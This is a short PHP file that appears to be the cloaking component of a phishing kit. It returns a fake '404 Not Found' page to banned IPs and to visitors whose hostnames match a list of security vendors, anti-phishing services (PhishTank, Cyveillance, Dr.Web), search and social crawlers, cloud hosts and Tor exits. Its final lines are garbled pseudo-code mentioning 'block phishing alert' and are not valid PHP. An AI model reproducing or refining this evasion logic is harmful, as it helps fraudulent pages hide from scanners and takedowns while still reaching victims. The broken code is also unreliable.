<?php

if(in_array($IP_Connected,$IP_Banned)){
    $errors = '<h1>404 Not Found</h1>The page that you have requested could not be found.<br>';
   // $errors .= gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>';
  // $errors .= php_uname();
    die($errors);
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}

if array {block_google_fb_twiiter..antibavis}
 
 else {bmpc}
 block phishing alert $owd
 ?


?>